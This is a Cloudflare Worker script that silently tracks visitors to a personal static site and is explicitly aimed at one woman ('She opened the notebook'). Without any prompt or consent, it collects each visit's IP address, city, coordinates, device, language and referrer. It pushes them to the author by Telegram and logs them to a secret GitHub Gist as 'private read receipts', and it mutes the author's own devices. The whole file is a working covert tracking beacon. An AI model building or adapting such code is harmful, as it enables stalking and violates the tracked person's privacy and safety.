// The Notebook to Pan — open relay (Cloudflare Worker)
//
// The static site pings this Worker once per visit. The Worker:
//   1. reads the visitor's city / coordinates from Cloudflare's edge (no GPS prompt),
//   2. sends a Telegram alert to you with a "🙈 Ignore this device" button,
//   3. appends one line to a SECRET Gist so you have a private history.
//
// Tapping "Ignore this device" on a message stores that browser's device id in
// KV, so YOUR devices stop pinging while hers keep coming through.
//
// Secrets (wrangler secret put ...):
//   TELEGRAM_BOT_TOKEN, TELEGRAM_CHAT_ID, GITHUB_TOKEN, GIST_ID
//   TG_SECRET (optional) — webhook shared secret, verified if set
// Binding (wrangler.toml): KV namespace IGNORE

const CORS = {
  "Access-Control-Allow-Origin": "*",
  "Access-Control-Allow-Methods": "POST, OPTIONS",
  "Access-Control-Allow-Headers": "Content-Type",
};

export default {
  async fetch(request, env, ctx) {
    if (request.method === "OPTIONS") return new Response(null, { headers: CORS });
    if (request.method !== "POST") return new Response("ok", { headers: CORS });

    let body = {};
    try { body = JSON.parse((await request.text()) || "{}"); } catch (_) {}

    // ---- Telegram webhook callback: you tapped "Ignore this device" ----
    if (body && (body.callback_query || body.update_id)) {
      if (env.TG_SECRET) {
        const got = request.headers.get("X-Telegram-Bot-Api-Secret-Token");
        if (got !== env.TG_SECRET) return new Response("forbidden", { status: 403 });
      }
      ctx.waitUntil(handleCallback(env, body));
      return new Response("ok"); // Telegram only needs a 200
    }

    // ---- Site open ping ----
    const dev = String(body.dev || "").slice(0, 64);
    if (dev && env.IGNORE && (await env.IGNORE.get("dev:" + dev))) {
      return new Response("ok", { headers: CORS }); // one of my own devices — silent
    }

    const cf = request.cf || {};
    const ip = request.headers.get("CF-Connecting-IP") || "";
    const place =
      [cf.city, cf.region, cf.country].filter(Boolean).join(", ") || "unknown location";
    const tz = cf.timezone || body.tz || "?";
    const coords = cf.latitude && cf.longitude ? `${cf.latitude},${cf.longitude}` : "";
    const maps = coords ? `https://maps.google.com/?q=${coords}` : "";
    const nick = String(body.nick || "").slice(0, 40);
    const tag = dev ? dev.replace(/-/g, "").slice(0, 4) : "";
    const name =
      (nick ? nick + " — " : "") + deviceName(body.ua) + (tag ? ` · #${tag}` : "");

    const now = new Date();
    let local = now.toISOString();
    try {
      local = new Intl.DateTimeFormat("en-GB", {
        dateStyle: "medium",
        timeStyle: "short",
        timeZone: tz,
      }).format(now);
    } catch (_) {}

    const line = [
      now.toISOString(),
      local,
      place,
      coords || "-",
      tz,
      name,
      ip || "-",
      body.lang || "-",
      (body.ref || "-"),
      dev || "-",
    ].join("\t");

    ctx.waitUntil(
      notifyTelegram(env, { local, place, coords, maps, tz, ip, ref: body.ref, name, dev })
    );
    ctx.waitUntil(appendGist(env, line));

    return new Response("ok", { headers: CORS });
  },
};

function deviceName(ua) {
  ua = ua || "";
  let os = "device", ver = "";
  if (/iPhone|iPad/.test(ua)) {
    os = /iPad/.test(ua) ? "iPad" : "iPhone";
    const m = ua.match(/OS (\d+(?:[._]\d+)*)/);
    if (m) ver = " iOS " + m[1].replace(/_/g, ".");
  } else if (/Android/.test(ua)) {
    os = "Android";
    const m = ua.match(/Android (\d+(?:\.\d+)*)/);
    if (m) ver = " " + m[1];
  } else if (/Macintosh|Mac OS X/.test(ua)) {
    os = "Mac";
  } else if (/Windows/.test(ua)) {
    os = "Windows";
  } else if (/Linux/.test(ua)) {
    os = "Linux";
  }
  const br = /Edg\//.test(ua) ? "Edge"
    : /OPR\/|Opera/.test(ua) ? "Opera"
    : /Brave/.test(ua) ? "Brave"
    : /CriOS|Chrome\//.test(ua) ? "Chrome"
    : /Firefox\//.test(ua) ? "Firefox"
    : /Safari\//.test(ua) ? "Safari"
    : "browser";
  return `${os}${ver} · ${br}`;
}

async function tg(env, method, payload) {
  if (!env.TELEGRAM_BOT_TOKEN) return;
  await fetch(`https://api.telegram.org/bot${env.TELEGRAM_BOT_TOKEN}/${method}`, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify(payload),
  });
}

async function notifyTelegram(env, { local, place, coords, maps, tz, ip, ref, name, dev }) {
  if (!env.TELEGRAM_BOT_TOKEN || !env.TELEGRAM_CHAT_ID) return;
  const text =
    "📖 *She opened the notebook*\n" +
    `🕯 ${local}  (${tz})\n` +
    `📍 ${place}\n` +
    (coords ? `🗺 ${coords}\n${maps}\n` : "") +
    `📱 ${name}\n` +
    (ref ? `↪️ from ${ref}\n` : "") +
    `🌐 ${ip || "unknown IP"}`;

  const payload = {
    chat_id: env.TELEGRAM_CHAT_ID,
    text,
    parse_mode: "Markdown",
    disable_web_page_preview: true,
  };
  if (dev) {
    payload.reply_markup = {
      inline_keyboard: [[{ text: "🙈 Ignore this device", callback_data: "ig:" + dev }]],
    };
  }
  await tg(env, "sendMessage", payload);
}

async function handleCallback(env, update) {
  const cq = update.callback_query;
  if (!cq) return;
  const data = cq.data || "";
  let note = "Done";

  if (data.startsWith("ig:") && env.IGNORE) {
    const id = data.slice(3);
    await env.IGNORE.put("dev:" + id, "1");
    note = "✅ This device is muted from now on";
    if (cq.message) {
      await tg(env, "editMessageText", {
        chat_id: cq.message.chat.id,
        message_id: cq.message.message_id,
        text: (cq.message.text || "") + "\n\n🙈 Muted — this device won't ping again.",
      });
    }
  }
  await tg(env, "answerCallbackQuery", { callback_query_id: cq.id, text: note });
}

async function appendGist(env, line) {
  if (!env.GITHUB_TOKEN || !env.GIST_ID) return;
  const api = `https://api.github.com/gists/${env.GIST_ID}`;
  const headers = {
    Authorization: `Bearer ${env.GITHUB_TOKEN}`,
    Accept: "application/vnd.github+json",
    "User-Agent": "notebook-pulse",
  };
  const FILE = "opens.log";

  let existing = "";
  try {
    const r = await fetch(api, { headers });
    if (r.ok) {
      const j = await r.json();
      existing = (j.files && j.files[FILE] && j.files[FILE].content) || "";
    }
  } catch (_) {}

  const header =
    "# Notebook opens — private read receipts\n" +
    "# iso\tlocal\tplace\tcoords\ttimezone\tdevice\tip\tlang\treferrer\tdev-id\n";
  const content = existing ? `${existing}\n${line}` : header + line;

  await fetch(api, {
    method: "PATCH",
    headers: { ...headers, "Content-Type": "application/json" },
    body: JSON.stringify({ files: { [FILE]: { content } } }),
  });
}
